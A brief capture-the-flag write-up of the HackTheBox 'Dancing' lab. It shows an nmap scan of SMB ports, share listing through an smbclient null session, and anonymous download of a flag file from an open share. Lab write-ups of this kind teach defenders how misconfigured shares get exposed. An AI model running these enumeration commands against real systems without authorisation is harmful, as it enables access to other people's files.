# Dancing - HackTheBox Writeup 💃

- **Platform:** HackTheBox (Starting Point - Tier 0)
- **Target OS:** Windows
- **Vulnerability:** Misconfigured SMB Share / Guest Access

---

## 📌 Reconnaissance

I performed an Nmap scan targeting SMB ports:

```bash
nmap -sV -p 139,445 <TARGET_IP>
```

### Scan Results:
- `445/tcp open microsoft-ds`

Port 445 (SMB) was open.

---

## ⚡ Enumeration & Exploitation

Using `smbclient`, I listed the available shares using a null session (`-N` flag):

```bash
smbclient -L //<TARGET_IP>/ -N
```

### Shares Discovered:
- `ADMIN$`
- `C$`
- `IPC$`
- `WorkShares` *(Custom open share)*

I connected to `WorkShares` without credentials:

```bash
smbclient //<TARGET_IP>/WorkShares -N
```

---

## 🚩 Flag Capture

I navigated through the directories on the share:

```smb
smb: \> ls
smb: \> cd James.Shares
smb: \James.Shares\> ls
smb: \James.Shares\> get flag.txt
```

Exited `smbclient` and read the flag:

```bash
cat flag.txt
```

---

## 💡 Notes & Takeaways
- SMB shares often contain sensitive documents if guest access is not restricted.
- Always check for non-default SMB shares during Windows enumeration.
